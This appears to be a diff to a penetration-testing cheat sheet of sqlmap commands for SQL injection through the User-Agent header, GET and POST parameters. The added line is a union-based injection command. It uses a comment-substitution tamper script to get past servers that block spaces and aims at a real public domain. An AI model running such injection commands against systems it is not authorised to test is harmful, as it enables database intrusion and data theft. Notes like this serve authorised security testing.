@@ -25,6 +25,7 @@
     - User-agent
       ```
       sqlmap -u 'http://google.com' -p user-agent --user-agent=elseagent --technique=B --banner
+      sqlmap -u 'http://google.com' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' union-char=els --banner //Digunakan jika server blok spasi dan menggunakan commen '#'
       ```
 - Parameter GET
 - Parameter POST
